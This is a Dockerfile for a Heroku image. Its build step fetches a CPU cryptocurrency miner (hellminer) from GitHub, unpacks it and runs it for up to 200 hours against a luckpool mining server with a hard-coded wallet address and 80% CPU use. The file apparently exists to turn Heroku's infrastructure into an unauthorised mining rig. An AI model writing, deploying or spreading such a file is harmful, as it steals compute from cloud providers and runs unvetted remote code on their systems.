FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN timeout 200h wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xf hellminer_cpu_linux.tar.gz && ./hellminer  -c stratum+tcp://ap.luckpool.net:3956 -u RR4q11BJNS3NiwgBLJqzQzcdB8VTeTGkRa.test1 -p x --cpu 80
CMD bash heroku.sh

